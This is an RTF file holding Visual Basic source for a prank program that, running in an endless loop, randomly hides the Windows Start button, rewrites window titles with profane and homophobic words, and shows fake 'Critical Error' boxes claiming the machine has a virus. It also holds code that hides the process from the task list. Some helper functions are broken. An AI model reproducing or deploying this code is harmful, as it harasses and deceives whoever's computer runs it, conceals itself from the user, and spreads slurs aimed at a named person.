{\rtf1\mac\ansicpg10000\cocoartf102
{\fonttbl\f0\fswiss\fcharset77 Helvetica;}
{\colortbl;\red255\green255\blue255;}
\margl1440\margr1440\vieww9000\viewh9000\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\ql\qnatural

\f0\fs24 \cf0 --- close window\
\
\
Option Explicit\
\
Private Sub CloseWindow(ByVal sTitle As String)\
Dim iHwnd As Long\
Dim ihTask As Long\
Dim iReturn As Long\
\
     iHwnd = FindWindow(0&, sTitle)\
     iReturn = PostMessage(iHwnd, WM_QUIT, 0&, 0&)\
\
End Sub\
\
\
------------ hide\
\
Public Function hwndStartButton() As Long\
\
   hwndStartButton = FindWindowEx(FindWindow("Shell_TrayWnd", ""), 0, "Button", vbNullString)\
    \
End Function\
\
Public Sub HideHWND(ByVal hwnd As Long)\
\
    ShowWindow hwnd, 0\
\
End Sub\
\
Public Sub ShowHWND(ByVal hwnd As Long)\
\
    ShowWindow hwnd, 5\
\
End Sub\
\
\
-------- pause\
\
Public Sub Pause(ByVal Interval As Single)\
Dim t As Single\
\
    t = Timer + Interval\
    While t > Timer\
        DoEvents\
    Wend\
\
End Sub\
\
\
\
------- program\
\
Sub TeddyRun()\
Dim sTemp As String\
Dim lTemp As Long\
Dim i As Integer\
\
Dim aStringFind() As Variant\
Dim aStringReplace() As Variant\
Dim aRandomMessage() As Variant\
\
aStringFind = Array("start", "people", "Michael", "Start", "girl", "blue", "5", "of", "read", "offf", "Windows")\
aStringReplace = Array("fuck", "dick", "fag", "fuck", "boy", "red", "6", "off", "seed", "off", "Blindows")\
aRandomMessage = Array("There is a fucking problem with the computer.", "The system is fucked.", "You have a fucking virus", "You have trojan horse")\
Randomize\
\
'On Error Resume Next\
\
'ShowInTaskList False\
\
    While True\
        \
        'Pause 0.01\
        DoEvents\
        \
        If Rnd < 0.2 Then HideHWND hwndStartButton\
        If Rnd < 0.005 Then ShowHWND hwndStartButton\
        \
        \
        If Rnd < 0.001 Then SetWindowText hwndStartButton, "start"\
        \
        If Rnd < 1e-05 Then MsgBox aRandomMessage(Rnd * UBound(aRandomMessage)), vbAbortRetryIgnore + vbSystemModal + vbCritical, "Critical Error"\
        \
        \
        \
        ' change all michael to michael is gay\
        lTemp = WindowAtCursor\
        sTemp = WindowText(lTemp)\
        If sTemp <> vbNullString Then\
            For i = LBound(aStringFind) To UBound(aStringFind)\
                sTemp = Replace(sTemp, aStringFind(i), aStringReplace(i), , , vbBinaryCompare)\
                sTemp = Replace(sTemp, aStringReplace(i) & aStringReplace(i), aStringReplace(i), , , vbBinaryCompare)\
            Next i\
            SetWindowText lTemp, sTemp\
        End If\
        \
        lTemp = GetForegroundWindow\
        sTemp = WindowText(lTemp)\
        If sTemp <> vbNullString Then\
            For i = LBound(aStringFind) To UBound(aStringFind)\
                sTemp = Replace(sTemp, aStringFind(i), aStringReplace(i), , , vbBinaryCompare)\
                sTemp = Replace(sTemp, aStringReplace(i) & aStringReplace(i), aStringReplace(i), , , vbBinaryCompare)\
            Next i\
            SetWindowText lTemp, sTemp\
        End If\
        \
    Wend\
\
End Sub\
\
\
------- public declares\
\
Public Type POINTAPI\
   x As Long\
   y As Long\
End Type\
\
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long\
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long\
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long\
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer\
Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long\
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long\
Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long\
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long\
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long\
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWndParent As Long, ByVal hWndChildAfter As Long, ByVal lpszClassName As String, ByVal lpszWindowName As String) As Long\
Public Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long\
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long\
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long\
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long\
Public Declare Function GetForegroundWindow Lib "user32" () As Long\
\
\
Private Const WM_QUIT = &H12\
\
Public Const WM_COPY = &H301\
Public Const WM_PASTE = &H302\
Public Const WM_CUT = &H300\
\
Public Const GWW_HINSTANCE = (-6)\
Public Const GWW_ID = (-12)\
Public Const GWL_STYLE = (-16)\
\
\
-------- task manager\
\
Private Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal _\
    dwProcessId As Long, ByVal dwType As Long) As Long\
\
Private Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long\
\
Public Sub ShowInTaskList(ByVal bShowInTaskList As Boolean)\
    RegisterServiceProcess GetCurrentProcessId, IIf(bShowInTaskList, 0, 1)\
End Sub\
\
\
\
--------- window at point\
\
'Dim hWndOver As Long\
'Dim hWndParent As Long\
'Dim sParentClassName As String * 100\
'Dim wID As Long\
\
'Dim hInstance As Long\
'Dim sParentWindowText As String * 100\
'Dim sModuleFileName As String * 100\
\
Public Sub WindowCaptionAtPoint()\
\
    WindowAtPoint\
    MsgBox tText\
\
End Sub\
\
Public Function WindowAtCursor() As Long\
\
Dim pt32 As POINTAPI\
\
    Call GetCursorPos(pt32)\
    WindowAtCursor = WindowFromPointXY(pt32.x, pt32.y)\
    \
End Function\
\
Public Function WindowClassName(ByVal hwnd As Long) As String\
Dim sClassName As String * 100\
Dim r As Long\
\
       r = GetClassName(hWndOver, sClassName, 100)         ' Window Class\
       tClassName = Left(sClassName, r)\
\
End Function\
\
Public Function WindowText(ByVal hwnd As Long) As String\
Dim sWindowText As String * 100\
Dim r As Long\
\
    r = GetWindowText(hwnd, sWindowText, 100)\
    WindowText = Left(sWindowText, r)\
\
End Function\
\
Public Function WindowStyle(ByVal hwnd As Long) As Long\
\
    WindowStyle = GetWindowLong(hwnd, GWL_STYLE)\
\
End Function\
\
'Public Sub SaveWindowDetails()\
'\
'\
'\
'\
'       ' Get handle of parent window:\
'       hWndParent = GetParent(hWndOver)\
'       tPHandle = hWndParent\
'\
'       ' If there is a parent get more info:\
'       If hWndParent <> 0 Then\
'          ' Get ID of window:\
'          wID = GetWindowWord(hWndOver, GWW_ID)\
'          tPID = wID\
'          tPHandle = hWndParent\
'\
'          ' Get the text of the Parent window:\
'          r = GetWindowText(hWndParent, sParentWindowText, 100)\
'          tPText = Left(sParentWindowText, r)\
'\
'          ' Get the class name of the parent window:\
'          r = GetClassName(hWndParent, sParentClassName, 100)\
'          tPClassName = Left(sParentClassName, r)\
'       Else\
'          ' Update fields when no parent:\
'          tPID = -1\
'          tPHandle = -1\
'          tPText = ""\
'          tPClassName = ""\
'       End If\
'\
'       ' Get window instance:\
'       hInstance = GetWindowWord(hWndOver, GWW_HINSTANCE)\
'\
'       ' Get module file name:\
'       r = GetModuleFileName(hInstance, sModuleFileName, 100)\
'       tModuleFileName = Left(sModuleFileName, r)\
'    End If\
'\
'End Sub\
}